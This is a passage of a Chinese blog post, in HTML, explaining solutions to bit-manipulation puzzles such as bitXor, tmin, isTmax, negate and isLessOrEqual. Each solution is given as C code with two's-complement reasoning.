operator\">~</span><span class=\"token punctuation\">(</span>y <span class=\"token operator\">&amp;</span> <span class=\"token operator\">~</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>bitXor 要求我们使用位操作来实现 <code>^</code>  运算符。根据运算定律我们知道:  <code>a ^ b = (a &amp; (~b)) | (b &amp; (~a))</code> 。但是问题来了，我们这里不允许使用 <code>|</code> ，只能用 <code>~</code>  和 <code>&amp;</code> 。那么我们就必须使用这两个操作符来实现 <code>|</code>  运算。<br>\n通过德摩根定律我们知道： <code>a | b = ~((~a) &amp; (~b))</code> 。这不就解决问题了嘛，所以将这两个式子综合一下，最后的结果是 <code>~((~(x &amp; ~y)) &amp; (~(y &amp; ~x)))</code></p>\n<h2 id=\"tmin\"><a class=\"markdownIt-Anchor\" href=\"#tmin\">#</a> tmin</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * tmin - return minimum two's complement integer</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Max ops: 4</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Rating: 1</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">tmin</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    * the most significant bit = 1, others = 0, so (1 &lt;&lt; 31)</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这题要求我们返回最小的补码整数，返回类型为 <code>int</code> 。首先，在二进制补码表示中，最高位的权值为 - 1，其他位的权值为 1。因此，最小的补码整数 tmin 的最高位为 1，其他位为 0。而题目中 <code>int</code>  类型为 32 位，因此只要返回 <code>(1 &lt;&lt; 31)</code>  即可。</p>\n<h2 id=\"istmax\"><a class=\"markdownIt-Anchor\" href=\"#istmax\">#</a> isTmax</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * isTmax - returns 1 if x is the maximum, two's complement number,</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *     and 0 otherwise</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | +</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Max ops: 10</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Rating: 1</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">isTmax</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    * Tmax ^ Tmin = 0xffffffff, ~0xffffffff = 0x0, !0x0 = 0x1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token comment\">// return !(~(x ^ (1 &lt;&lt; 31)));</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    * ~Tmax = Tmin -> ~Tmin + 1 = Tmin 且 Tmin != 0</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token operator\">~</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>num <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span>num<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>tmax 是二进制补码中最大的数，通过分析这个数的特点，我们可以完成这道题目。</p>\n<ol>\n<li>该数除了最高位是 0 外，其他位均是 1。因此该数和 (1&lt;&lt;31)（也就是 tmin）的亦或（或者和）为 <code>0xffffffff</code> 。 <code>0xffffffff</code>  按位取反得到 <code>0x0</code> ，而 <code>0x0</code>  按位取反得到 <code>0x1</code> 。但是其他的数并没有这个特性。</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>该数取反后得到 tmin，tmin 的一个特点是 tmin 和 -tmin 的表示相同。因此两者亦或得到 0。还有一个树也有这样的特性，也就是 0。因此我们需要排除 0 的可能性。我们使用 <code>&amp;</code>  操作符来实现两种特性的叠加。我本没有想到该方法，是从这篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MTQxMjY3OTU=\">知乎帖子</span>学习到的。</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token operator\">~</span>x<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>num <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>num <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token operator\">!</span><span class=\"token operator\">!</span>num<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>但是题目不允许在该题中使用移位运算符，因此只能使用方法二。</p>\n<h2 id=\"alloddbits\"><a class=\"markdownIt-Anchor\" href=\"#alloddbits\">#</a> allOddBits</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * allOddBits - return 1 if all odd-numbered bits in word set to 1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   where bits are numbered from 0 (least significant) to 31 (most significant)</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Max ops: 12</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   Rating: 2</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">allOddBits</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    * tear the number into 4 parts, get rid of the other digits except 0xaa</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    * if the results are all the same, then compare it with 0xaa, if there are the same, xor returns 0</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    * otherwise not all odd bits in word set is set to 1</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">int</span> first <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">int</span> second <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">int</span> third <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">int</span> fourth <span class=\"token operator\">=</span> x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>first <span class=\"token operator\">&amp;</span> second <span class=\"token operator\">&amp;</span> third <span class=\"token operator\">&amp;</span> fourth<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>对于单个字节的奇数位，我们可以使用 <code>0xaa</code>  作为 mask。<br>\n本题目中我将位打成 4 个部分，每个部分与 mask 相与。如果每个奇数位都是 1 的话，四个部分的比较结果应该相同，都等于 <code>0xaa</code> ，该值与 <code>0xaa</code>  异或得到 <code>0x0</code> ，取 <code>!</code>  后得到 <code>0x1</code> 。否则该值不为 <code>0xaa</code> ，同 <code>0xaa</code>  亦或得到其他非零值，取 <code>!</code>  后得到 <code>0x0</code> 。</p>\n<h2 id=\"negate\"><a class=\"markdownIt-Anchor\" href=\"#negate\">#</a> negate</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * negate - return -x</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Example: negate(1) = -1.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Max ops: 5</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Rating: 2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">negate</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>x <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>该题目中我们需要求解某个数的相反数。在课堂中我们学过，一个数和它相反数的和为 0。那么如何获得其相反数呢？以 <code>x</code>  为例，我们知道 <code>x + ~x = ~0</code> ，也就是全 f，然后 <code>~0 + 1 = 0</code> 。因此， <code>-x</code>  的补码表示即为 <code>~x + 1</code> 。</p>\n<h2 id=\"isasciidigit\"><a class=\"markdownIt-Anchor\" href=\"#isasciidigit\">#</a> isAsciiDigit</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9')</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Example: isAsciiDigit(0x35) = 1.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *            isAsciiDigit(0x3a) = 0.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *            isAsciiDigit(0x05) = 0.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   Max ops: 15</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> *   Rating: 3</pre></td></tr><tr><td data-num=\"9\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">isAsciiDigit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    * least = (x &amp; 0xf) - 0xa</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    * if least > 0 (with 0 in most significant bit) then least = 0</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    * else least = 1</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token keyword\">int</span> least <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token number\">0xa</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">int</span> second <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">return</span> least <span class=\"token operator\">&amp;</span> second<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里我使用的方法是将该数拆分为最低位和其他位来比较。我们将最低位与 <code>0xa</code>  相减，如果求得的结果为负数，符号位即为 1，代表该值在 0-9 之间。接下来判断其他位是否为 <code>0x3</code> ，如果是，则和 <code>0x3</code>  异或结果为 0，通过逻辑 <code>!</code>  返回 1。</p>\n<h2 id=\"conditional\"><a class=\"markdownIt-Anchor\" href=\"#conditional\">#</a> conditional</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * conditional - same as x ? y : z</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Example: conditional(2,4,5) = 4</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Max ops: 16</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Rating: 3</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">conditional</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> z<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    * judge if x != 0, if true, !!x = 1, return y, otherwise !!x = 0, return z</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token comment\">// cond gets all f when !!x == 1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token keyword\">int</span> cond <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token operator\">!</span>x<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>cond <span class=\"token operator\">&amp;</span> y<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>cond <span class=\"token operator\">&amp;</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里我们先获取 <code>x</code>  的值，如果 <code>x != 0</code> ，则 <code>!!x = 0x1</code> ，否则为 <code>0x0</code> 。扩展该值，当该值为 <code>0x1</code>  时与 <code>y</code>  相与得到 y。当该值为 <code>0x0</code> ，取反后与 z 相与得到 z。因为这两个值只取其一，当一边不为 0 时另一边必然为 0，因此两边用 <code>|</code>  连接。</p>\n<h2 id=\"islessorequal\"><a class=\"markdownIt-Anchor\" href=\"#islessorequal\">#</a> isLessOrEqual</h2>\n<blockquote>\n<p>本题要求使用最多 24 个运算符，但是这里我使用的过多了，应该会有更好的办法。期待有人指正。</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * isLessOrEqual - if x &lt;= y  then return 1, else return 0</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *   Example: isLessOrEqual(4,5) = 1.</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Max ops: 24</pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Rating: 3</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">isLessOrEqual</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>   <span class=\"token comment\">// first compare their sign bit</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>   <span class=\"token keyword\">int</span> sign_x <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>   <span class=\"token keyword\">int</span> sign_y <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>y <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>   <span class=\"token comment\">// return true if sign = 1(>0)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>   <span class=\"token keyword\">int</span> sign_diff <span class=\"token operator\">=</span> sign_x <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>sign_y <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>   <span class=\"token keyword\">int</span> sign_bit <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sign_diff <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   <span class=\"token comment\">// then compare the magnitude</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">int</span> mask <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>   <span class=\"token keyword\">int</span> mag_x <span class=\"token operator\">=</span> x <span class=\"token operator\">&amp;</span> mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   <span class=\"token keyword\">int</span> mag_y <span class=\"token operator\">=</span> y <span class=\"token operator\">&amp;</span> mask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>   <span class=\"token keyword\">int</span> mag_diff <span class=\"token operator\">=</span> mag_x <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">~</span>mag_y <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>   <span class=\"token keyword\">int</span> mag_sign <span class=\"token operator\">=</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>mag_x <span class=\"token operator\">^</span> mag_y<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>mag_diff <span class=\"token operator\">>></span> <span class=\"token number\">31</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>   <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    * 2 conditions return true:</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    * 1. sign of x = 1 and sign of y = 0</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    * 2. sign of x and y equals, and magnitude of x &lt;= y</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    */</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>   <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>sign_bit<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> sign_diff<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>sign_diff<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> mag_sign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这里要分几种情况：</p>\n<ol>\n<li>x 为负数，y 为正数，直接返回 <code>0x1</code></li>\n<li>x 和 y 同符号，比较数值部分。x &lt;= y 时，返回 <code>0x1</code> ；x &gt; y 时，返回 <code>0x0</code></li>\n<li>x 为正数，y 为负数，返回 <code>0x0</code></li>\n</ol>\n<p>其中 <code>sign_diff</code>  为两数符号位之差，此处分三种情况：</p>\n<ol>\n<li>x 为负数，符号位为 1；y 为正数，符号位为 0。那么两者符号位相减等于 <code>0x1</code> ，该值的符号位为 0。（这是我们要返回 <code>0x1</code>  的结果）</li>\n<li>x 为正数，符号位为 0；y 为负数，符号位为 1。那么两者符号位相减等于 <code>0xffffffff</code>  (-1)，该值的符号位为 1。（我们不要这个结果）</li>\n<li>x 和 y 的符号位相同，两者相减为 <code>0x0</code> ，该值的符号位为 0。（这里我们要看情况，看 <code>x</code>  是否和 <code>y</code>  相等）</li>\n</ol>\n<p>代码中 <code>sign_diff</code>  为两符号位之差， <code>sign_bit</code>  为该做差结果的最高位。当 x 和 y 的符号位不相同时，当 <code>sign_diff</code>  为 <code>0x1</code>  且 <code>sign_bit</code>  为 <code>0x0</code>  是，我们返回 <code>0x1</code> 。这也是运算结果 <code>|</code>  左半边的由来。</p>\n<p>代码中 <code>mag_diff</code>  为两者数值部分之差， <code>mag_sign</code>  为该差值的符号位。当 <code>x &lt; y</code>  时， <code>mag_diff</code>  为 <code>0xffffffff</code> 。当 <code>x == y</code>  时， <code>!(mag_x ^ mag_y)</code>  为 <code>0x1</code> 。因此 <code>mag_sign = !(mag_x ^ mag_y) | ((mag_diff &gt;&gt; 31) &amp; 0x1)</code> 。在判断数值之差部分时，我们需要保证两数符号位之差为 <code>0x0</code> ，而不是其他（如 x 正 y 负）。因此运算结果右半边的值为 <code>(!sign_diff) &amp; mag_sign</code> 。</p>\n<p>综上，最后的结果是 <code>((!sign_bit) &amp; sign_diff) | ((!sign_diff) &amp; mag_sign)</code> 。</p>\n<h2 id=\"logicalneg\"><a class=\"markdownIt-Anchor\" href=\"#logicalneg\">#</a> logicalNeg</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * logicalNeg - implement the ! operator, using all of</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> *              the legal operators except !</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> *   Legal ops: ~ &amp; ^ | + &lt;&lt; >></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> *   Max ops: 12</pre></td></tr><tr><td data-num=\"7\"></td><td><pre> *   Rating: 4</pre></td></tr><tr><td data-num=\"8\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">logicalNeg</span><span class=\"token 